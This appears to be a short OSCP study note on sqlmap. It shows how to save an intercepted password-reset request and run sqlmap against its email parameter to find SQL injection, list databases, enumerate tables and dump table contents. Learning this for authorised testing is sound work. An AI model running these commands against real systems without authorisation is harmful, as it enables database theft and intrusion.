[[Synced OSCP Notes/Tools/SQLmap|SQLmap]]

Intercept a web request of "test", copy the post request and save it to a file called reset.req

Feed this to SQLmap

```
sqlmap -r reset.req -p email --batch
```

```
sqlmap -r reset.req -p email --batch --level 3
```

get a list of the available databases
```
sqlmap -r reset.req -p email --batch --level 3 --dbs
```

enumerate tables in database
```
sqlmap -r reset.req -p email --batch --level 3 -D [database_name] --tables --threads=10
```

dump a table's contents
```
sqlmap -r reset.req -p email --batch --level 3 -D [database_name] -T [table_name] --dump
```